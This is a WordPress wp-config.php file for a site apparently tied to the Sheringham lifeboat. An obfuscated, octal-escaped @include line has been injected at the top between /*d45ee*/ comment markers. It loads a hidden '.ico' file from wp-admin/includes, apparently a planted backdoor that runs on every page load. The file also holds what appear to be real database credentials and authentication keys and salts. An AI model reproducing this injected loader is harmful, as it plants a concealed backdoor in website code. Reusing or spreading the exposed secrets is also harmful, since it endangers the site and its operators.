<?php
/*d45ee*/

@include "\057hom\145/sh\145rin\147h/p\165bli\143_ht\155l/w\160-ad\155in/\151ncl\165des\057.43\067e01\1467.i\143o";

/*d45ee*/
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
//define('DB_NAME', 'sheringham_lifeboat');
define('DB_NAME', 'sheringh_wp');

/** MySQL database username */
//define('DB_USER', 'root');
define('DB_USER', 'sheringh_wp');

/** MySQL database password */
//define('DB_PASSWORD', '');
define('DB_PASSWORD', 'r-yP3DdgpmHS*i.3b{');


/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '|T$2?w%s,r-yP3DdgpmHS*i.3b{4B]y|S23YI#:eq!kG-Yep,#LmPJ5N:2F>|4J$');
define('SECURE_AUTH_KEY',  '_xh:NH~3>m9>bw@PP-LcEwx371X;iuc)ZjF6)C+NoxwDrNZq1R/#HsF7su{Vsy:a');
define('LOGGED_IN_KEY',    'iL7$f1[zA2k,|Sb.++?iM8MiMVNZ^+UB1/`vH)bk;+IhczjB#s-mXcJaZHgxL*/w');
define('NONCE_KEY',        'j-&OHGc:6,GUX-cfM&v{Tl&|$Ca at)(TqZK>hmvlTj1eF1iIJ^ /Ri6faE;1?5P');
define('AUTH_SALT',        '!F2})wq9V0;Pox~Q%e}c]REQ1 `ymlAc,_: gb.m&1 H@{[C-s[);z@Qp%Nml?G1');
define('SECURE_AUTH_SALT', 'gf}~EKN;+o5-7!(R 1AZ$%I)De5PQ_{zNCgFY8g^E6NF>vKiY/|@go?/K_S+_Xm|');
define('LOGGED_IN_SALT',   'h>+p_clJu4;`(3,nq6r!|Wi8)JS/7z-XZ43b:sn83e=yD,XiZXXh.M{Ln5J[ZDE?');
define('NONCE_SALT',       'Y+Zi6mPlE/7+-:tp3@+d~|K<B}jL8>:qHxd;Li >L%,[k9dSfa/`|~r[{S+DY`i;');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
